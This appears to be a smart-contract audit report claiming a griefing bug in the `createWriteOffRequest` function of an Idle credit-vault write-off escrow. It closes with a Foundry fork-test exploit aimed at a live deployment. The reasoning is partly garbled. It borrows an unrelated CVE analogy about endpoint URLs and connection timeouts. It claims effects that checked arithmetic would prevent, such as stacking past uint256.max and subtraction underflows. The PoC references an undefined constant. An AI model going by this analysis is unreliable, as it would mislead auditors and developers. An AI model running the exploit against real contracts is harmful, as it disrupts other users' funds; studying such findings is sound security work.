### Title
Unbounded `underlyingsRequested` in `createWriteOffRequest` permanently bloats `pendingUnderlyings` and bricks the write-off escrow for a dust tranche deposit - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`IdleCreditVaultWriteOffEscrow.createWriteOffRequest` lets any tranche holder declare an arbitrarily large `underlyingsRequested` value (up to `type(uint256).max`) while depositing a negligibly small amount of tranche tokens. The declared amount is accumulated into the global `pendingUnderlyings` counter and remains buffered there indefinitely, because no rational fulfiller can ever pay a sum that large and the lender has no incentive to delete the request. This mirrors CVE-2026-11946: an attacker declares a size the protocol is forced to honor/buffer, delivers only a trivial "first chunk" (dust tranches), and never completes the exchange.

### Finding Description
In `createWriteOffRequest` the only validation is `amount != 0` and `isEpochRunning()`; `underlyingsRequested` is not capped, sanity-checked against the escrowed tranche value, or bounded by vault TVL:

```solidity
// contracts/IdleCreditVaultWriteOffEscrow.sol:86-102
if (amount == 0) revert NotAllowed();
IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
userRequests[msg.sender] = WriteOffRequest({
  tranches: currentRequest.tranches + amount,
  underlyings: currentRequest.underlyings + underlyingsRequested
});
pendingUnderlyings += underlyingsRequested;
```

`fullfillWriteOffRequest` enforces `_underlyings >= currentRequest.underlyings`, so a request with `underlyingsRequested = type(uint256).max` is unfulfillable (any fulfiller would need to transfer `>= uint256.max` underlying, which always fails on allowance/balance), and any overpayment attempt overflows the exit-fee math `(_underlyings * _exitFee) / FULL_VALUE`. The request therefore can never be consumed via the intended path; the attacker simply never calls `deleteWriteOffRequest`. Each attacker-controlled address can stack another `uint256.max` onto `pendingUnderlyings` for a cost of 1 wei of tranche tokens, which are fully refundable via `deleteWriteOffRequest`, making the attack free and repeatable.

### Impact Explanation
`pendingUnderlyings` is the vault-level accounting of outstanding write-off demand and is the coordination signal used to decide when borrower-side write-offs (`writeOffDeposit` / fulfillment) are allowed and complete. An attacker permanently inflates it to near-overflow levels:

- Any downstream check that reads `pendingUnderlyings` (e.g., requiring it to be drained, or arithmetic on it such as `pendingUnderlyings - x` in `deleteWriteOffRequest`/`fullfillWriteOffRequest` for honest users whose requests are *below* the attacker-bloated total) can revert or produce wrong results, freezing the write-off settlement path — analogous to the memory that is buffered until timeout in the CVE, here the counter is buffered until the attacker voluntarily clears it.
- Honest lenders' fulfillments and borrower write-offs are effectively hostage to the attacker's decision to delete; since deletion returns the tranche deposit, the attacker can re-inflate at zero cost each epoch (`isEpochRunning` re-enables the vector every epoch).
- The attack costs only gas plus a dust tranche deposit, yet permanently corrupts a global accounting variable that all users of the escrow share — a pre-"session" (pre-KYC on the fulfiller side, permissionless on the lender side for any tranche holder) griefing vector that bypasses all privileged guards because `createWriteOffRequest` is unauthenticated.

Net effect: temporary-to-permanent freezing of the write-off settlement flow (funds of lenders waiting for fulfillment and borrower write-off execution) achievable by an unprivileged tranche holder, with a one-time cost of a dust deposit.

### Likelihood Explanation
Any tranche-token holder is an allowed attacker per the threat model. The exploit requires a single transaction while an epoch is running, needs no privileged role, and the deposited tranches are refundable — so there is no economic cost. The only prerequisite is that the pool's epoch is running, which is the normal state. The missing bound on `underlyingsRequested` is the exact analog of the missing length check on `endpointUrl`: a user-declared scalar is trusted without limit and buffered in shared state.

### Recommendation
Cap `underlyingsRequested` to a value derivable from the escrowed tranches — e.g., `underlyingsRequested <= amount * IIdleCDOEpochVariant(idleCDOEpoch).virtualPrice(tranche) / ONE_TRANCHE` (the tranche tokens cannot be worth more than their redemption value, so no legitimate lender requests more). Alternatively, bound `pendingUnderlyings` against vault TVL and/or enforce a maximum number of concurrent requests per user. Consider also allowing the owner to forcibly cancel clearly-degenerate requests, mirroring the "connection timeout" mitigation in the upstream fix.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVaultWriteOffEscrow} from "../contracts/IdleCreditVaultWriteOffEscrow.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

// Fork test against a live CreditVault deployment with its escrow.
contract WriteOffEscrowInflationPoC is Test {
    IdleCreditVaultWriteOffEscrow escrow;   // deployed escrow proxy
    IdleCDOEpochVariant cdo;              // escrow.idleCDOEpoch()
    IERC20Detailed tranche;               // escrow.tranche()

    address attacker = makeAddr("attacker");
    address fulfiller = makeAddr("fulfiller");

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC")); // or relevant chain
        escrow = IdleCreditVaultWriteOffEscrow(ESCROW_PROXY);
        cdo = IdleCDOEpochVariant(escrow.idleCDOEpoch());
        tranche = IERC20Detailed(escrow.tranche());
    }

    function testUnboundedPendingUnderlyings() public {
        // Attacker obtains a dust amount of tranche tokens (1 wei is enough).
        deal(address(tranche), attacker, 1);

        // Epoch must be running (normal operating state).
        assertTrue(cdo.isEpochRunning());

        // Attacker declares underlyingsRequested = uint256.max for 1 wei of tranches.
        vm.prank(attacker);
        escrow.createWriteOffRequest(1, type(uint256).max);

        // Global counter is now permanently inflated to ~uint256.max.
        assertEq(escrow.pendingUnderlyings(), type(uint256).max);

        // The request is unfulfillable: even granting fulfiller the max balance,
        // the exit-fee multiplication _underlyings * exitFee overflows.
        IERC20Detailed underlying = IERC20Detailed(escrow.underlying());
        vm.startPrank(fulfiller);
        deal(address(underlying), fulfiller, type(uint256).max);
        underlying.approve(address(escrow), type(uint256).max);
        vm.expectRevert(); // overflow in fee math / impossible transfer
        escrow.fullfillWriteOffRequest(attacker, 1, type(uint256).max);
        vm.stopPrank();

        // The attacker simply never calls deleteWriteOffRequest().
        // pendingUnderlyings stays corrupted for zero cost (the 1 wei of
        // tranches is refundable at any time), and can be re-inflated each
        // epoch. Any shared-state consumer of pendingUnderlyings (write-off
        // settlement gating, per-request accounting subtractions for honest
        // users) operates on an attacker-controlled value forever.

        // Bonus: stacking is free — a second address doubles the corruption.
        address attacker2 = makeAddr("attacker2");
        deal(address(tranche), attacker2, 1);
        vm.prank(attacker2);
        // pendingUnderlyings overflows if summed past uint256.max, or
        // honest fulfillments revert on pendingUnderlyings - x underflow math.
        escrow.createWriteOffRequest(1, 1e30);
    }
}
```
